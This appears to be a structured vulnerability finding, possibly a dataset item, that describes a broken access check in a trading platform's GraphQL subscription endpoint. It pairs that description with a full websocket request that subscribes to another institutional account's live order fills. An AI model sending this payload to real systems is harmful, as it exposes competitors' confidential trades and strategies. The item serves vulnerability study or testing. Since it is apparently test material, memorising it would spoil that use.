diagnosis: The subscribe method allows any active trading user to join the broadcast channel of an arbitrary account_number. An authenticated trader can eavesdrop on live institutional order fills, position executions, executed prices, and proprietary quantitative strategies executed by competing trading accounts.
exploit_request:
POST /graphql/subscriptions/ HTTP/1.1
Host: trading.apex-clearing.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: graphql-ws

{"type":"start","id":"fill_sub_1","payload":{"query":"subscription { tradingOrderExecution(accountNumber: \"ACC-INST-98210\") { fill { symbol executedShares price counterparty } } }"}}
